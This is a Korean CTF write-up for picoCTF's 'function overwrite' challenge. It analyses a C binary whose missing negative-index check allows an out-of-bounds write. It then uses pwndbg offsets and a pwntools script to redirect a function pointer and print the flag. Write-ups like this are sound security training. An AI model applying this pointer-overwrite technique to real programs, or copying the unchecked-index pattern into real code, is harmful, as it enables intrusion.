# [function overwrite](https://play.picoctf.org/practice/challenge/272?category=6&originalEvent=70&page=2)
<br>

**Description:**
> Story telling class 2/2
<br>

**Binary Protections:**
```yaml
[*] '/home/kali/pico/vuln'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

<br>

**Source Code:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

int calculate_story_score(char *story, size_t len)
{
  int score = 0;
  for (size_t i = 0; i < len; i++)
  {
    score += story[i];
  }

  return score;
}

void easy_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 1337)
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f); // size bound read
    printf("You're 1337. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("You've failed this class.");
  }
}

void hard_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 13371337)
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f); // size bound read
    printf("You're 13371337. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("You've failed this class.");
  }
}

void (*check)(char*, size_t) = hard_checker;
int fun[10] = {0};

void vuln()
{
  char story[128];
  int num1, num2;

  printf("Tell me a story and then I'll tell you if you're a 1337 >> ");
  scanf("%127s", story);
  printf("On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n");
  scanf("%d %d", &num1, &num2);

  if (num1 < 10)
  {
    fun[num1] += num2;
  }

  check(story, strlen(story));
}
 
int main(int argc, char **argv)
{

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```
<br>

문제에서 제공되는 바이너리는 음수를 검사하지 않아서 스택 외 다른 주소를 참조할 수 있는 OOB 취약점이 발생합니다. 이 취약점으로 `hard_checker()` 의 주소를 `easy_checker()` 으로 조작하고 조건을 만족시키면 문제를 풀 수 있습니다.

프로그램의 동작을 분석하겠습니다.

<br>

```c
void (*check)(char*, size_t) = hard_checker;
int fun[10] = {0};

void vuln()
{
  char story[128];
  int num1, num2;

  printf("Tell me a story and then I'll tell you if you're a 1337 >> ");
  scanf("%127s", story);
  printf("On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n");
  scanf("%d %d", &num1, &num2);

  if (num1 < 10)
  {
    fun[num1] += num2;
  }

  check(story, strlen(story));
}
```
`story`, `num1`, `num2` 는 각 형식에 맞게 입력을 받아 스택에 저장됩니다. 이때 `num1`의 크기가 `10`보다 작다면 `fun[num1]`에 `num2`를 저장하지만, 음수에 대한 검사를 따로 하지 않으므로 OOB 취약점이 발생합니다. 이후 `check()`의 인자를 받아 `hard_charker()`를 호출합니다.

<br>

```c
int calculate_story_score(char *story, size_t len)
{
  int score = 0;
  for (size_t i = 0; i < len; i++)
  {
    score += story[i];
  }

  return score;
}
```
`calculate_story_score()` 는 인자로 `story`, `len`을 받고 있으며, `story`의 `i` 번째 값을 `score`에 누적시킵니다. 이는 `story`의 길이만큼 반복하며, 반복문이 종료되면 `score`를 반환합니다.

<br>

```c
void easy_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 1337)
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f); // size bound read
    printf("You're 1337. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("You've failed this class.");
  }
}

void hard_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 13371337)
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f); // size bound read
    printf("You're 13371337. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("You've failed this class.");
  }
}
```
`easy_checker()`, `hard_checker()` 두 함수 모두 `calculate_story_score(story, len)`의 연산 결과가 요구하는 값과 일치해야 flag가 출력되는 것 을 알 수 있습니다. 
***

위 분석을 통해 바이너리에는 OOB가 발생한다는 것을 알 수 있습니다. 이제 음수 인덱스를 참조해서 `hard_checker()`를 `easy_checker()`로 조작해야 합니다. 아래 과정을 통해 조작이 가능합니다.

```bash
$ gdb vuln -q
...
pwndbg> b *vuln+130
Breakpoint 1 at 0x80495f2
pwndbg> r
Starting program: /home/kali/pico/vuln
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Tell me a story and then I'll tell you if you're a 1337 >> a
On a totally unrelated note, give me two numbers. Keep the first one less than 10.
0
0

Breakpoint 1, 0x080495f2 in vuln ()
...
───────────────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────────────
 ► 0x80495f2 <vuln+130>    mov    eax, dword ptr [ebp - 0x8c]             EAX, [0xffffd10c] => 0
   0x80495f8 <vuln+136>    mov    ecx, dword ptr [ebx + eax*4 + 0x80]     ECX, [fun] => 0
   0x80495ff <vuln+143>    mov    edx, dword ptr [ebp - 0x90]             EDX, [0xffffd108] => 0
   0x8049605 <vuln+149>    mov    eax, dword ptr [ebp - 0x8c]             EAX, [0xffffd10c] => 0
   0x804960b <vuln+155>    add    edx, ecx                                EDX => 0 (0 + 0)
   0x804960d <vuln+157>    mov    dword ptr [ebx + eax*4 + 0x80], edx     [fun] <= 0
   0x8049614 <vuln+164>    mov    esi, dword ptr [ebx + 0x40]             ESI, [check] => 0x8049436 (hard_checker) ◂— endbr32
   0x804961a <vuln+170>    sub    esp, 0xc                                ESP => 0xffffd0f4 (0xffffd100 - 0xc)
   0x804961d <vuln+173>    lea    eax, [ebp - 0x88]                       EAX => 0xffffd110 —▸ 0xffff0061 ◂— 0
   0x8049623 <vuln+179>    push   eax
   0x8049624 <vuln+180>    call   strlen@plt                  <strlen@plt>

pwndbg> p &fun
$1 = (<data variable, no debug info> *) 0x804c080 <fun>
pwndbg> p &check
$2 = (<data variable, no debug info> *) 0x804c040 <check>
pwndbg> p/x 0x804c080 - 0x804c040
$3 = 0x40
pwndbg> p/d 0x40 / 4
$4 = 16
```
`check`는 `hard_checker()`를 가리키고 있으며, `fun`으로부터 `-16`에 위치해 있습니다.

```bash
pwndbg> x/a 0x804c040
0x804c040 <check>:      0x8049436 <hard_checker>
pwndbg> p easy_checker
$5 = {<text variable, no debug info>} 0x80492fc <easy_checker>
pwndbg> p/d 0x8049436 - 0x80492fc
$6 = 314
```
`hard_checker()`와 `easy_checker()`의 거리는 `314`만큼 차이가 나며, `hard_checker()`의 주소에 `314`만큼 빼주면 `easy_checker()`의 주소를 계산할 수 있습니다.

<br>

이제 반복문을 통해 `score`에 누적된 값이 `1337`이면 flag가 출력될 것입니다. 아래 방법으로 `1337`을 만들 수 있습니다.

```bash
pwndbg> p/d 1337 / 15
$22 = 89
pwndbg> p/d 89*15
$23 = 1335
```
아스키로 표현이 가능한 범위에서 `1337`을 나누고 나머지 값을 더해주면 `1337`을 만들 수 있습니다. 위에서 알아낸 정보를 가지고 공격 코드를 작성할 수 있습니다.

<br>
<br>

```python
from pwn import *

def conn():
  if len(sys.argv) == 3:
    host, port = sys.argv[1], int(sys.argv[2])
    p = remote(host, port)
  else:
    p = process('./vuln')
  return p

context.log_level = 'error'

p = conn()

p.sendline(chr(89).encode()*15 + chr(2).encode())
p.sendline(str(-16).encode())
p.sendline(str(-314).encode())

p.interactive()
```
```bash
$ python3 test.py saturn.picoctf.net 56410
Tell me a story and then I'll tell you if you're a 1337 >> On a totally unrelated note, give me two numbers. Keep the first one less than 10.
You're 1337. Here's the flag.
picoCTF{0v3rwrit1ng_P01nt3rs_55516c93}
$
```
